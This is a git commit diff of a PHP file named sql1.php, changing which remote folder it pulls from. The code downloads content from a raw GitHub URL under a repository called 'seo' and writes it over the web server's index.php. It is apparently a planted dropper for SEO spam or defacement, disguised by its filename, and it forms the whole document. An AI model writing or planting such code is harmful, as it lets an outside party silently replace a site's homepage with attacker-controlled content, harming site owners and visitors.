ebd9cfa39ff49b7adaf7423f7208f5af4774fd1d
2321enjwdadunjd <132290011+2321enjwdadunjd@users.noreply.github.com>
2023-06-01 15:14:07 +0700

    Update sql1.php

--- sql1.php
+++ sql1.php
@@ -1,6 +1,6 @@
 <?php
 $file = basename($_SERVER['DOCUMENT_ROOT']) . '.php';
-$content = file_get_contents('https://raw.githubusercontent.com/2321enjwdadunjd/seo/main/21/' . $file);
+$content = file_get_contents('https://raw.githubusercontent.com/2321enjwdadunjd/seo/main/22/' . $file);
 $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php', 'w+');
 fwrite($fp, $content);
 fclose($fp);
